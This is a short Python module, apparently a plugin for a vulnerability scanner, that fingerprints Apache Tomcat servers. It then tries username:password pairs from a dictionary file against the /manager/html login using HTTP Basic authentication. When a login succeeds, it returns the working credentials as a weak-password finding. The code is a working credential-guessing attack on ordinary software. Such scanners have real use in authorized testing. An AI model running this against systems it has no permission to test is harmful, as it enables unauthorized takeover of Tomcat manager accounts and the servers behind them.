import base64
import time

from ServiceScanModel.models import ServiceScan
from .. import fileUtil, requestUtil
from ..requestClass import Requests


def tomcat_poc(url):
    print(url)
    with fileUtil.open_file("dict_tomcat/dic_tomcat_key.txt", "r") as f:
        for i in f.readlines():
            authorized_key = i.strip()
            resp = requestUtil.get(url + "/manager/html", header={
                "Authorization": "Basic %s" % (base64.b64encode(authorized_key.encode()).decode())})
            if "Tomcat Host Manager Application" in resp.text:
                return (
                    ["tomcat弱密码", "用户名：%s<br>密码：%s" % (authorized_key.split(":")[0], authorized_key.split(":")[-1])],
                    (base64.b64encode(authorized_key.encode()).decode()))
    return []


class POC:
    def __init__(self, service: ServiceScan):
        self.service = service
        self.requestUtil = Requests(service.cookies)
        self.result = False

    def fingerprint(self):
        if not "Apache-Coyote" in self.service.server:
            return False
        else:
            try:
                resp = requestUtil.get(self.service.url + "/manager/html")
                if not resp.status_code == 401:
                    raise Exception
                else:
                    return True
            except Exception as e:
                print(e)
                return False

    def poc(self):
        return tomcat_poc(self.service.url)
